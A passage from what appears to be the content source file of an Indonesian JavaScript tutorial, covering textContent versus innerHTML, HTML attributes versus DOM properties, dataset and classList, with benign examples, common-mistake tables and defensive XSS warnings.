          [
            'Memakai `innerText` karena namanya mirip `textContent`',
            'Keduanya sama-sama soal teks',
            '`innerText` memperhitungkan gaya dan tata letak, sehingga ia memicu perhitungan layout dan tidak menampilkan teks yang tersembunyi. Untuk mengisi teks, `textContent` lebih cepat dan lebih dapat diprediksi',
          ],
          [
            "Mengosongkan elemen dengan `el.innerHTML = ''`",
            'Cara paling pendek',
            'Untuk elemen dengan banyak anak, `el.replaceChildren()` lebih jelas maksudnya dan tidak melewati pengurai HTML sama sekali',
          ],
          [
            'Menggabung teks dan HTML dalam satu template literal',
            'Sekali tulis langsung jadi',
            'Setiap nilai yang disisipkan harus diperiksa satu per satu asalnya. Bangun node terpisah, dan biarkan pemisahan itu terlihat di kodenya',
          ],
        ],
      ),
      p(
        'Baris keempat layak diingat karena perbedaannya punya biaya yang bisa diukur. `innerText` harus tahu bagaimana teks itu **ditampilkan**, sehingga membacanya memaksa peramban menghitung ulang tata letak. Di dalam loop, itu persis pola yang membuat halaman melambat drastis seperti dibahas di Sub-bab 4.11. Kecuali kamu memang butuh teks sebagaimana terlihat pengguna, pakai `textContent`.',
      ),
      callout(
        'tip',
        'Aturan satu kalimat yang menutup hampir seluruh sub-bab ini',
        'Kalau nilainya berasal dari luar kodemu, entah dari pengguna, dari server, atau dari alamat halaman, ia masuk lewat `textContent`. Kalau markupnya kamu tulis sendiri sebagai teks tetap tanpa sisipan apa pun, `innerHTML` boleh. Ragu berarti pakai `textContent`.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        '`textContent` adalah default. Pakai yang lain hanya kalau ada alasan jelas.',
        'Data pengguna di `innerHTML` = XSS, tanpa perlu tag `<script>`.',
        '`innerHTML +=` mem-parse ulang seluruh isi dan menghapus listener, fokus, serta nilai input.',
        '`innerText` memperhitungkan CSS dan memaksa perhitungan layout — paling mahal.',
        'Kalau HTML memang wajib, sanitasi dengan library teruji.',
      ),
      references(
        {
          label: 'Node.textContent',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Node/textContent',
          source: 'MDN',
          note: 'Bagian "Differences from innerText" merangkum ketiga property yang dibandingkan di sini.',
        },
        {
          label: 'Element.innerHTML',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML',
          source: 'MDN',
          note: 'Halaman ini sendiri memuat peringatan keamanan resmi tentang data dari pengguna.',
        },
        {
          label: 'Element.insertAdjacentHTML()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/insertAdjacentHTML',
          source: 'MDN',
          note: 'Menyisipkan tanpa mem-parse ulang isi yang sudah ada — tetap bukan untuk data pengguna.',
        },
        {
          label: 'Cross Site Scripting Prevention Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Panduan pencegahan XSS yang mendasari seluruh peringatan di sub-bab ini.',
        },
        {
          label: 'Content Security Policy (CSP)',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP',
          source: 'MDN',
          note: 'Lapisan pertahanan kedua yang membatasi dampak XSS bila ada yang lolos.',
        },
      ),
    ],
  ),

  written(
    'atribut-property-dataset',
    'Atribut, Property & `dataset`',
    19,
    'Dua dunia yang mirip tapi tidak sama — dan kenapa nilai input sering tidak sesuai dugaan.',
    [
      p(
        '**Atribut** adalah yang tertulis di HTML. **Property** adalah yang ada di objek DOM. Saat halaman dimuat, atribut dipakai untuk mengisi property — tapi setelah itu keduanya bisa berpisah.',
      ),

      terms(
        {
          term: 'atribut',
          meaning:
            'Dari *attribute*. Yang **tertulis di dalam tag HTML**: `<input value="awal">`. Sifatnya selalu berupa **teks**, apa pun isinya — bahkan `disabled` yang terasa seperti boolean sebenarnya hanya teks kosong. Atribut mencerminkan **keadaan awal** halaman, bukan keadaan sekarang.',
        },
        {
          term: 'property',
          meaning:
            'Yang ada di **objek DOM** hasil parsing: `input.value`. Tipenya bisa apa saja — teks, angka, boolean, bahkan objek. Ia mencerminkan **keadaan sekarang**, dan inilah yang hampir selalu kamu butuhkan.',
        },
        {
          term: 'refleksi',
          meaning:
            'Dari *reflection*. Hubungan dua arah antara sebagian atribut dan property-nya: mengubah salah satu ikut mengubah yang lain. Yang perlu dihafal justru **pengecualiannya** — `value`, `checked`, dan `selected` **berhenti saling mencerminkan** begitu pengguna berinteraksi dengan elemennya. Di situlah sumber bug "form mengirim nilai lama".',
        },
        {
          term: 'defaultValue',
          meaning:
            'Property yang **tetap** mencerminkan atribut `value` di HTML, berapa pun kali pengguna mengetik. Pasangannya untuk checkbox adalah `defaultChecked`. Berguna saat kamu ingin mengembalikan form ke keadaan semula.',
        },
        {
          term: 'getAttribute / setAttribute',
          meaning:
            'Method untuk membaca dan menulis **atribut**, bukan property. Perlu diingat: hasilnya selalu teks, dan untuk `value` maupun `checked` ia memberi keadaan awal — bukan yang sedang dilihat pengguna.',
        },
        {
          term: 'data-*',
          meaning:
            'Atribut khusus yang boleh kamu karang sendiri asalkan diawali `data-`, misalnya `data-status="aktif"`. Ini **satu-satunya cara resmi** menempelkan data buatanmu ke sebuah elemen tanpa melanggar standar HTML.',
        },
        {
          term: 'dataset',
          meaning:
            'Property yang mengumpulkan semua atribut `data-*` sebuah elemen menjadi satu objek. Perhatikan perubahan penamaannya: `data-jumlah-item` di HTML menjadi `el.dataset.jumlahItem` di JavaScript — tanda hubung hilang dan huruf berikutnya menjadi kapital.',
        },
        {
          term: 'className',
          meaning:
            'Nama property untuk atribut `class`. Namanya berbeda karena `class` sudah menjadi **kata kunci JavaScript** sejak awal, sehingga tidak boleh dipakai sebagai nama property. Kejanggalan sejarah yang sama juga melahirkan `htmlFor` untuk atribut `for`.',
        },
        {
          term: 'boolean attribute',
          meaning:
            'Atribut yang **maknanya ditentukan oleh ada-tidaknya**, bukan oleh nilainya — `disabled`, `checked`, `required`. Menulis `disabled="false"` justru tetap menonaktifkan elemennya, karena yang dibaca browser adalah keberadaan atributnya. Untuk mengubahnya dari JavaScript, pakai property-nya: `el.disabled = false`.',
        },
      ),

      h2('Perbedaan yang paling sering menggigit'),
      code('html', `<input id="nama" value="awal">`),
      code(
        'js',
        `
        const input = document.querySelector('#nama');

        // Pengguna mengetik "Zum" ke dalam input
        input.value;                    // 'Zum'    — property: nilai SEKARANG
        input.getAttribute('value');    // 'awal'   — atribut: nilai AWAL di HTML

        input.defaultValue;             // 'awal'   — property yang mencerminkan atribut
        `,
      ),
      p(
        "Ketiga baris ini membaca `<input>` yang sama dan memberi tiga jawaban berbeda, dan itu bukan kejanggalan melainkan pembagian tugas yang disengaja. **Atribut** adalah apa yang tertulis di HTML, dan ia dibekukan pada keadaan **awal**. Berapa pun banyaknya pengguna mengetik, `getAttribute('value')` tetap menjawab `'awal'`. **Property** hidup di objek DOM dan mencerminkan keadaan **sekarang**, jadi `input.value` mengikuti ketikan pengguna. `defaultValue` ada sebagai jembatan, yaitu property yang isinya sengaja mencerminkan atribut, berguna misalnya untuk mengembalikan form ke nilai semula. Kesalahan yang lahir dari sini selalu terlihat sama, berupa form yang mengirim data lama meski pengguna sudah jelas-jelas mengubahnya di layar.",
      ),
      callout(
        'warning',
        'Selalu pakai `.value`, bukan `getAttribute("value")`',
        'Ini bug yang membuat form mengirim nilai lama. Aturan yang sama berlaku untuk `checked`, `selected`, dan `disabled` — semuanya punya versi atribut (keadaan awal) dan versi property (keadaan sekarang).',
      ),
      code(
        'js',
        `
        checkbox.checked;                    // true/false — keadaan sekarang
        checkbox.getAttribute('checked');    // '' atau null — hanya keadaan AWAL
        `,
      ),
      p(
        "Checkbox membuat perbedaan tadi jadi lebih menjebak, karena bentuk jawabannya pun berbeda. `checkbox.checked` menjawab boolean sungguhan, `true` atau `false`. `getAttribute('checked')` menjawab **string kosong** kalau atributnya ada di HTML, atau `null` kalau tidak — dan tidak satu pun dari keduanya berubah ketika pengguna mengeklik. Yang berbahaya, string kosong bernilai falsy sedangkan string apa pun yang tidak kosong bernilai truthy, sehingga kode seperti `if (checkbox.getAttribute('checked'))` justru menjawab terbalik dari yang kamu duga. Aturannya sederhana dan berlaku untuk `checked`, `selected`, maupun `disabled`: untuk **membaca keadaan sekarang**, selalu lewat property.",
      ),

      h2('`class` vs `className`'),
      code(
        'js',
        `
        el.className;                  // string penuh — 'kartu aktif besar'
        el.getAttribute('class');      // sama
        el.classList;                  // API yang sebaiknya kamu pakai (sub-bab berikutnya)
        `,
      ),
      p(
        'Namanya `className`, bukan `class`, karena `class` sudah menjadi kata kunci JavaScript, sisa sejarah yang tidak bisa diperbaiki lagi. Dua baris pertama setara dan sama-sama memberi **satu string utuh** berisi semua kelas yang dipisah spasi, dan di situlah masalahnya. Menambah satu kelas berarti merangkai string, dan menghapus satu kelas berarti memotong string dengan hati-hati agar tidak meninggalkan spasi ganda atau menghapus kelas lain yang namanya mirip. `classList` menghindarkan seluruh urusan itu dengan memperlakukan kelas sebagai **daftar** dan bukan teks, dan itulah yang dibahas tuntas di sub-bab berikutnya.',
      ),

      h2('Kapan memakai atribut'),
      code(
        'js',
        `
        // Untuk atribut kustom dan ARIA, property-nya tidak ada — pakai setAttribute
        el.setAttribute('aria-expanded', 'true');
        el.setAttribute('role', 'dialog');
        el.removeAttribute('hidden');
        el.hasAttribute('disabled');    // true/false

        // Atribut boolean: yang menentukan adalah ADA atau TIDAK, bukan nilainya
        el.setAttribute('disabled', 'false');   // TETAP DISABLED — jebakan klasik
        el.removeAttribute('disabled');         // baru benar-benar aktif
        el.disabled = false;                    // atau lewat property
        `,
      ),
      p(
        "Kelompok pertama menunjukkan kapan `setAttribute` memang **satu-satunya jalan**. Atribut ARIA dan atribut kustom tidak punya property padanan di objek DOM, jadi `el.ariaExpanded = true` tidak akan berpengaruh apa pun pada sebagian besar lingkungan. Kelompok kedua memuat jebakan yang paling sering memakan waktu. Untuk **atribut boolean** seperti `disabled`, yang menentukan adalah **ada atau tidak adanya atribut itu** dan bukan nilainya, sehingga `setAttribute('disabled', 'false')` justru **menonaktifkan** tombolnya karena atributnya kini ada. Kata `false` di sana dibaca browser sebagai nilai yang tidak relevan, bukan sebagai pembatalan. Dua baris terakhir menunjukkan dua cara yang benar, yaitu menghapus atributnya, atau menyetel property-nya ke `false`. Untuk atribut boolean, jalur property hampir selalu lebih sulit dipakai keliru.",
      ),

      h2('`data-*` dan `dataset`'),
      code('html', `<button data-id="42" data-status-kirim="menunggu">Kirim</button>`),
      code(
        'js',
        `
        const btn = document.querySelector('button');

        btn.dataset.id;            // '42'        — SELALU string
        btn.dataset.statusKirim;   // 'menunggu'  — data-status-kirim jadi camelCase

        btn.dataset.id = '43';                    // menulis
        Number(btn.dataset.id);                   // 43 — ubah sendiri kalau butuh angka

        delete btn.dataset.statusKirim;           // menghapus atributnya
        `,
      ),
      p(
        "Atribut `data-*` adalah satu-satunya atribut kustom yang sah menurut spesifikasi HTML, dan `dataset` adalah pintu masuknya yang jauh lebih nyaman daripada `getAttribute('data-id')`. Ada dua aturan penerjemahan yang perlu diingat. Pertama, **tanda hubung berubah jadi camelCase**, sehingga `data-status-kirim` di HTML diakses sebagai `dataset.statusKirim` di JavaScript, dan awalan `data-` selalu dibuang. Kedua, dan yang paling sering menggigit, **isinya selalu string**. `dataset.id` menghasilkan `'42'` dengan tanda kutip, bukan angka `42`, sehingga membandingkannya dengan `=== 42` selalu bernilai `false`. Baris `Number(btn.dataset.id)` adalah konversi yang harus kamu tulis sendiri. Perhatikan juga `dataset` bekerja dua arah, karena menugaskan nilai padanya benar-benar mengubah atribut di HTML, dan `delete` menghapusnya.",
      ),
      callout(
        'tip',
        '`data-*` menghubungkan DOM ke datamu',
        'Pola yang akan kamu pakai terus di sub-bab event delegation: satu listener di wadah, lalu `event.target.closest("[data-id]").dataset.id` untuk tahu baris mana yang diklik. Jangan simpan objek besar di sana — cukup identitasnya.',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Tabel produk di panel admin punya tombol Tandai Habis di tiap baris. Saat diklik, tombolnya harus mati sementara permintaan berjalan, dan barisnya harus menyimpan harga aslinya supaya bisa dikembalikan kalau pengguna membatalkan. Kamu menulisnya dengan `setAttribute` untuk semuanya, dan hasilnya tombol yang terlihat mati tapi masih bisa diklik, serta harga asli yang kadang terbaca sebagai teks kadang sebagai angka.',
      ),
      p(
        'Dua bug itu berasal dari satu kesalahpahaman, yaitu mengira atribut di HTML dan properti di objek DOM adalah hal yang sama. Keduanya berhubungan, dan hubungannya tidak selalu dua arah.',
      ),
      code(
        'js',
        `
        const tombol = baris.querySelector('[data-aksi="habis"]');

        // Atribut: nilainya SELALU teks.
        tombol.setAttribute('disabled', 'false');
        console.log(tombol.disabled);        // true  <- keberadaan atributnya yang dihitung

        // Properti: tipenya sesuai maksudnya.
        tombol.disabled = false;
        console.log(tombol.hasAttribute('disabled'));   // false
        `,
        { caption: 'Untuk atribut boolean, yang menentukan keberadaannya bukan nilainya.' },
      ),
      p(
        "Inilah penyebab tombol yang terlihat mati tapi masih bisa diklik, atau sebaliknya. Atribut boolean seperti `disabled`, `checked`, `readonly`, dan `required` dianggap aktif kalau atributnya **ada**, tidak peduli isinya apa. Menulis `setAttribute('disabled', 'false')` justru mematikan tombolnya, sebab teks `false` tetap berarti atributnya ada. Untuk atribut boolean, selalu pakai propertinya, yaitu `tombol.disabled = false`.",
      ),
      code(
        'js',
        `
        const kotak = document.querySelector('#nama');

        kotak.value;                      // apa yang diketik pengguna SEKARANG
        kotak.getAttribute('value');      // nilai awal dari HTML, tidak ikut berubah
        kotak.defaultValue;               // sama dengan atributnya

        // Setelah pengguna mengetik 'Budi' di kotak yang HTML-nya value="Sari":
        // kotak.value                 -> 'Budi'
        // kotak.getAttribute('value') -> 'Sari'
        `,
        { caption: 'Untuk input, atribut adalah nilai awal dan properti adalah nilai sekarang.' },
      ),
      p(
        'Perbedaan ini menjelaskan bug yang sangat sering pada formulir, yaitu tombol Reset yang tidak mengembalikan apa pun atau justru mengembalikan nilai yang salah. Atribut `value` adalah **nilai awal**, sedangkan properti `value` adalah **keadaan sekarang**. Untuk membaca apa yang diketik pengguna, selalu properti. Untuk mengubah nilai awal yang dipakai tombol Reset, barulah atributnya.',
      ),
      code(
        'js',
        `
        // Menyimpan data milik aplikasi di elemen, lewat atribut data-.
        baris.dataset.produkId = '7';
        baris.dataset.hargaAsli = '89000';

        // Penamaan berubah otomatis antara camelCase dan tanda hubung.
        baris.dataset.hargaAsli;                    // '89000'
        baris.getAttribute('data-harga-asli');      // '89000'  <- diverifikasi di Chromium

        // NILAINYA SELALU TEKS. Ubah sendiri saat dibaca.
        const harga = Number(baris.dataset.hargaAsli);
        if (Number.isNaN(harga)) throw new TypeError('harga-asli bukan angka');
        `,
        { filename: 'src/admin/baris-produk.js' },
      ),
      p(
        "Perubahan nama otomatis itu mengikuti aturan tetap, yaitu `hargaAsli` di JavaScript menjadi `harga-asli` di HTML. Aturannya sama seperti properti CSS di JavaScript, dan sekali dipahami ia tidak pernah menjadi masalah lagi. Yang tetap menjadi masalah adalah tipenya, sebab **seluruh** nilai atribut adalah teks. Angka 89000 yang kamu simpan kembali sebagai teks `'89000'`, dan menjumlahkannya dengan `+` akan menggabungkan teks seperti dibahas di Bab 1.",
      ),
      p(
        'Batas pemakaian yang sehat untuk atribut data adalah menyimpan **pengenal**, bukan menyimpan data. Menyimpan `data-produk-id` sangat masuk akal, sebab ia pendek, tidak sensitif, dan memang menghubungkan elemen ke datanya. Menyimpan seluruh object produk sebagai JSON di dalam atribut adalah tanda bahwa kamu memakai DOM sebagai basis data, dan itu selalu berakhir buruk.',
      ),
      callout(
        'warning',
        'Apa pun yang kamu taruh di atribut bisa dibaca dan diubah pengguna',
        'Atribut `data-` terlihat di tab Elements dan bisa disunting siapa pun lewat DevTools. Jangan pernah menaruh harga yang dipakai server untuk menagih, peran pengguna, atau tanda bahwa sesuatu sudah dibayar. Nilai dari atribut adalah masukan dari luar, dan server wajib memeriksanya ulang.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Sebagian besar kegagalan di sub-bab ini tidak melempar apa pun, dan itu yang membuatnya lama ditelusuri. Tiga yang pertama diverifikasi langsung di Chromium.',
      ),
      code(
        'text',
        `
        tombol.setAttribute('disabled', 'false');
        console.log(tombol.disabled);

        true
        `,
        { caption: 'Tidak ada error, dan hasilnya kebalikan dari yang dimaksud.' },
      ),
      p(
        "Kalau kamu bermaksud mengaktifkan tombol dan justru mematikannya, inilah penyebabnya. Untuk benar-benar menghapus atribut boolean, pakai `removeAttribute('disabled')` atau setel propertinya menjadi `false`. Aturan praktisnya, jangan pernah memakai `setAttribute` untuk atribut boolean sama sekali, sebab tidak ada nilai teks yang bisa berarti mati.",
      ),
      code(
        'text',
        `
        const e = document.querySelector('.baris');
        e.style.width = 100;
        console.log(JSON.stringify(e.style.width));

        ""
        `,
        { caption: 'Angka tanpa satuan diabaikan diam-diam.' },
      ),
      p(
        "Properti gaya menerima **teks CSS**, dan `100` tanpa satuan bukan nilai CSS yang sah untuk lebar. Peramban tidak melempar apa pun melainkan mengabaikannya, sehingga hasilnya teks kosong. Gejalanya berupa elemen yang tidak berubah ukuran tanpa satu pun tanda di console. Selalu sertakan satuannya, yaitu `e.style.width = '100px'`. Pengecualiannya hanya properti yang memang tanpa satuan seperti `opacity`, `zIndex`, dan `lineHeight`.",
      ),
      code(
        'text',
        `
        const e = document.querySelector('.baris');
        e.dataset.hargaAsli = '1';
        console.log(e.getAttribute('data-harga-asli'));

        1
        `,
        { caption: 'Perubahan nama otomatis bekerja, dan tipenya tetap teks.' },
      ),
      p(
        "Ini bukan error melainkan bukti perilakunya, dan ditampilkan karena separuh kebingungan seputar `dataset` selesai begitu seseorang melihat keluarannya sekali. Yang perlu diingat dari keluaran ini adalah tanda kutipnya tidak ada di console karena `getAttribute` memang mengembalikan teks `'1'`, dan console menampilkan teks tanpa kutip pada penggabungan. Perlakukan hasilnya sebagai teks selalu.",
      ),
      code(
        'text',
        `
        document.getElementById('f').submit();
                                     ^

        TypeError: document.getElementById(...).submit is not a function
        `,
        { caption: 'Ada input bernama `submit` di dalam formulirnya.' },
      ),
      p(
        'Ini jebakan lama DOM yang masih hidup sampai sekarang. Elemen formulir bisa diakses lewat namanya sebagai properti formulir, sehingga `<input name="submit">` menimpa method `form.submit`. Hal yang sama terjadi untuk `name="action"`, `name="method"`, dan `name="id"`. Hindari nama-nama itu untuk kolom formulir, dan kalau tidak bisa dihindari, panggil methodnya lewat prototipenya.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            "Tombol tetap mati padahal disetel `'false'`",
            'Atribut boolean dinilai dari keberadaannya',
            'Pakai propertinya, atau `removeAttribute`',
          ],
          [
            'Gaya tidak berubah tanpa satu pun error',
            'Nilai gaya diberikan tanpa satuan',
            "Sertakan satuannya, misalnya `'100px'`",
          ],
          [
            'Angka dari `dataset` menjadi teks saat dijumlahkan',
            'Seluruh nilai atribut bertipe teks',
            'Ubah dengan `Number()` lalu periksa dengan `Number.isNaN`',
          ],
          [
            '`form.submit is not a function`',
            'Ada kolom bernama `submit` yang menimpa methodnya',
            'Ganti nama kolomnya, atau panggil lewat prototipe formulir',
          ],
          [
            'Nilai input tidak berubah walau atributnya diubah',
            'Atribut adalah nilai awal, bukan nilai sekarang',
            'Setel propertinya, yaitu `input.value`',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Atribut dan properti mudah dipakai bergantian sampai kamu bertemu kasus yang membedakannya. Enam baris di bawah adalah kasus-kasus itu.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Memakai `setAttribute` untuk semuanya',
            'Satu cara untuk semua kasus terasa konsisten',
            'Untuk atribut boolean hasilnya kebalikan, dan untuk nilai input ia hanya mengubah nilai awal. Pakai properti sebagai bawaan, dan `setAttribute` hanya untuk atribut yang tidak punya properti',
          ],
          [
            "Membaca `input.getAttribute('value')` untuk mengambil ketikan pengguna",
            'Namanya jelas menyebut value',
            'Itu nilai awal dari HTML, bukan yang sedang diketik. Pakai `input.value`',
          ],
          [
            'Menyimpan object sebagai JSON di dalam atribut data',
            'Datanya jadi menempel di elemennya',
            'Ukurannya membengkak di HTML, harus diurai tiap dibaca, dan bisa disunting siapa pun. Simpan idnya saja, lalu cari datanya di penyimpanan aplikasi',
          ],
          [
            'Menyimpan keadaan aplikasi hanya di DOM',
            'DOM kan sudah menampilkan keadaannya',
            'Kamu jadi harus membaca layar untuk tahu keadaan program, dan keduanya bisa menyimpang. Simpan keadaan di JavaScript, dan biarkan DOM menjadi hasil tampilannya',
          ],
          [
            'Memakai atribut khusus buatan sendiri seperti `produk-id`',
            'Ia bekerja dan terlihat rapi',
            'Atribut yang bukan standar dan tanpa awalan `data-` membuat HTML tidak sah, dan tidak muncul di `dataset`. Selalu pakai awalan `data-`',
          ],
          [
            "Mengubah `class` lewat `setAttribute('class', ...)`",
            'Sama saja hasilnya',
            'Ia menimpa seluruh kelas yang sudah ada, termasuk yang dipasang bagian lain. Pakai `classList.add` dan `classList.remove`',
          ],
        ],
      ),
      p(
        'Baris keempat adalah keputusan arsitektur yang menentukan seberapa jauh kodemu bisa tumbuh. Saat DOM dijadikan tempat menyimpan keadaan, setiap pertanyaan tentang keadaan aplikasi harus dijawab dengan membaca elemen, dan setiap perubahan harus menjaga dua tempat tetap cocok. Pola yang dipakai seluruh kerangka kerja modern adalah kebalikannya, yaitu keadaan hidup di JavaScript dan DOM adalah hasil penggambarannya. Materi Bab 6 dan seterusnya dibangun di atas pilihan itu.',
      ),
      callout(
        'tip',
        'Aturan tiga baris untuk memilih antara atribut dan properti',
        'Untuk atribut boolean, selalu properti. Untuk nilai input yang sedang diketik, selalu properti. Untuk atribut yang tidak punya padanan properti, misalnya `aria-label`, `colspan`, dan seluruh `data-`, pakai `setAttribute` atau `dataset`. Di luar ketiganya, keduanya sama saja dan properti biasanya lebih pendek.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        'Atribut = keadaan awal di HTML; property = keadaan sekarang di objek DOM.',
        'Untuk `value`, `checked`, `selected`, `disabled` — selalu pakai property.',
        'Atribut boolean ditentukan keberadaannya, bukan nilainya.',
        'ARIA dan atribut kustom dipakai lewat `setAttribute`.',
        '`dataset` selalu mengembalikan string; `data-status-kirim` menjadi `dataset.statusKirim`.',
      ),
      references(
        {
          label: 'Attributes and properties',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/setAttribute',
          source: 'MDN',
          note: 'Menegaskan bahwa nilai atribut selalu teks, apa pun tipe property pasangannya.',
        },
        {
          label: 'HTMLElement.dataset',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/dataset',
          source: 'MDN',
          note: 'Aturan penerjemahan nama: `data-status-kirim` menjadi `dataset.statusKirim`.',
        },
        {
          label: 'Using data attributes',
          href: 'https://developer.mozilla.org/en-US/docs/Learn_web_development/Howto/Solve_HTML_problems/Use_data_attributes',
          source: 'MDN',
          note: 'Cara resmi menempelkan data buatanmu ke elemen tanpa melanggar standar HTML.',
        },
        {
          label: 'HTMLInputElement.value',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/value',
          source: 'MDN',
          note: 'Sumber perbedaan `value` dan `defaultValue` — inti jebakan "form mengirim nilai lama".',
        },
        {
          label: 'Boolean attributes',
          href: 'https://html.spec.whatwg.org/multipage/common-microsyntaxes.html#boolean-attributes',
          source: 'WHATWG HTML',
          note: 'Aturan resmi bahwa maknanya ditentukan keberadaannya, bukan nilainya.',
        },
      ),
    ],
  ),

  written(
    'class-dan-style',
    'Class & Style: `classList`, CSS variable',
    20,
    'Mengubah tampilan tanpa menaburkan style inline ke seluruh kode.',
    [
      terms(
        {
          term: 'classList',
          meaning:
            'Property yang memperlakukan atribut `class` sebagai **daftar yang bisa diutak-atik satu per satu**, bukan sebagai satu untai teks panjang. Inilah sebabnya ia jauh lebih aman daripada `className`: menambah satu class tidak berisiko menghapus class lain yang sudah ada di sana.',
        },
        {
          term: 'toggle',
          meaning:
            'Artinya **membalik keadaan**. `classList.toggle("terbuka")` menambah class kalau belum ada dan menghapusnya kalau sudah ada. Bentuk keduanya jauh lebih berguna: `toggle("error", !valid)` **memaksa** sesuai boolean, dan itu menggantikan empat baris `if`/`else` tanpa kemungkinan lupa cabang sebaliknya.',
        },
        {
          term: 'style inline',
          meaning:
            'Style yang ditulis langsung pada elemen lewat `el.style.warna = ...`, bukan lewat berkas CSS. Ia menang atas hampir semua aturan CSS, dan justru itulah masalahnya: begitu ditaburkan dari JavaScript, tidak ada lagi satu tempat untuk mengetahui tampilan sebenarnya sebuah elemen.',
        },
        {
          term: 'CSS variable',
          meaning:
            'Disebut juga *custom property*. Nilai yang kamu definisikan sendiri di CSS dengan awalan dua tanda hubung: `--warna-utama: #8f5314`. Keunggulannya untuk JavaScript besar — kamu cukup mengubah **satu variabel**, dan semua aturan CSS yang memakainya ikut berubah, tanpa perlu menyentuh style tiap elemen.',
        },
        {
          term: 'setProperty',
          meaning:
            'Method untuk menulis CSS variable dari JavaScript: `el.style.setProperty("--warna", "red")`. Wajib memakai method ini, karena nama berawalan `--` tidak bisa ditulis dengan notasi titik biasa.',
        },
        {
          term: 'getComputedStyle',
          meaning:
            'Fungsi yang mengembalikan nilai CSS yang **benar-benar berlaku** pada sebuah elemen setelah semua aturan diperhitungkan — bukan hanya yang ditulis inline. Perlu diwaspadai: memanggilnya **memaksa browser menghitung tata letak**, sehingga mahal kalau dipakai di dalam loop.',
        },
        {
          term: 'design token',
          meaning:
            'Nilai desain yang dikunci di satu tempat dan dipakai ulang di mana-mana — warna, spasi, radius sudut. Website yang sedang kamu baca ini memakai pola tersebut lewat CSS variable, dan aturan projectnya melarang menulis nilai warna langsung di komponen.',
        },
        {
          term: 'separation of concerns',
          meaning:
            'Terjemahannya **pemisahan urusan**. Prinsip bahwa tampilan diurus CSS dan perilaku diurus JavaScript. Wujud praktisnya di sub-bab ini: JavaScript sebaiknya hanya **menambah atau menghapus class**, lalu CSS yang memutuskan class itu terlihat seperti apa.',
        },
      ),

      h2('`classList`'),
      code(
        'js',
        `
        el.classList.add('aktif');
        el.classList.remove('tersembunyi');
        el.classList.toggle('terbuka');            // ada -> hapus, tidak ada -> tambah
        el.classList.toggle('terbuka', kondisi);   // paksa sesuai boolean
        el.classList.contains('aktif');            // true/false
        el.classList.replace('lama', 'baru');

        el.classList.add('a', 'b', 'c');           // beberapa sekaligus
        `,
      ),
      p(
        'Seluruh method di sini bekerja pada **satu kelas sebagai satuan**, bukan pada string gabungan, dan itulah keunggulannya atas `className`. `add` yang dipanggil untuk kelas yang sudah ada tidak menggandakannya, dan `remove` untuk kelas yang tidak ada tidak melempar error. Keduanya aman dipanggil berulang, sehingga kamu tidak perlu memeriksa dulu dengan `contains`. Dua baris `toggle` layak dibedakan. Bentuk satu argumen adalah sakelar, sehingga kelas yang ada menjadi hilang dan yang tidak ada menjadi muncul. Bentuk dua argumen **memaksa** hasilnya mengikuti boolean, dan bentuk inilah yang jauh lebih sering kamu butuhkan, karena tampilan biasanya harus mengikuti keadaan data, bukan berganti-ganti sendiri. Bedanya terasa saat fungsinya dipanggil dua kali berturut-turut dengan keadaan yang sama, karena bentuk sakelar akan salah sedangkan bentuk berkondisi tetap benar.',
      ),
      callout(
        'tip',
        'Bentuk `toggle(nama, kondisi)` menghapus banyak `if`',
        '`el.classList.toggle("error", !valid)` menggantikan empat baris if/else, dan tidak mungkin lupa cabang sebaliknya.',
      ),

      h2('Kenapa class mengalahkan style inline'),
      code(
        'js',
        `
        // SALAH: tampilan tersebar di JavaScript, tidak bisa dipakai ulang,
        // sulit di-override, dan mengabaikan media query serta dark mode.
        el.style.backgroundColor = '#e5a13c';
        el.style.padding = '12px';
        el.style.borderRadius = '8px';

        // BENAR: tampilan tetap di CSS, JavaScript hanya mengubah keadaan
        el.classList.add('kartu-aktif');
        `,
      ),
      p('Aturan praktisnya: **JavaScript mengubah keadaan, CSS memutuskan tampilannya.**'),

      h2('Kapan `style` memang tepat'),
      code(
        'js',
        `
        // Nilai yang dihitung saat berjalan dan tidak mungkin ditulis di CSS
        bar.style.width = \`\${persen}%\`;
        tooltip.style.transform = \`translate(\${x}px, \${y}px)\`;
        `,
      ),
      p(
        'Kedua nilai ini punya sifat yang sama, yaitu **tidak mungkin diketahui saat CSS ditulis**. Lebar bar progres bergantung pada angka yang baru ada ketika program berjalan, dan posisi tooltip bergantung pada di mana kursor berada. Kamu tidak bisa membuat kelas CSS untuk setiap persentase dari 0 sampai 100, jadi di sinilah `style` langsung memang jawabannya. Perhatikan bedanya dengan contoh SALAH di atas. Yang ditulis dari JavaScript hanya **satu nilai yang berubah-ubah**, bukan keseluruhan tampilan, karena warna, tinggi, dan sudut lengkung bar tetap urusan CSS. Aturan pembedanya bisa diringkas begini. Kalau nilainya bisa ditulis di berkas CSS, tulis di sana, dan kalau ia hasil perhitungan saat berjalan, barulah lewat `style`.',
      ),

      h2('CSS custom property — jembatan terbaik'),
      code(
        'css',
        `
        .bar {
          width: var(--progres, 0%);
          background: var(--warna-bar, currentColor);
          transition: width 300ms ease-out;
        }
        `,
      ),
      code(
        'js',
        `
        // JavaScript hanya mengoper ANGKA; CSS yang memutuskan cara memakainya
        bar.style.setProperty('--progres', \`\${persen}%\`);

        // Membacanya kembali
        getComputedStyle(bar).getPropertyValue('--progres');
        `,
      ),
      p(
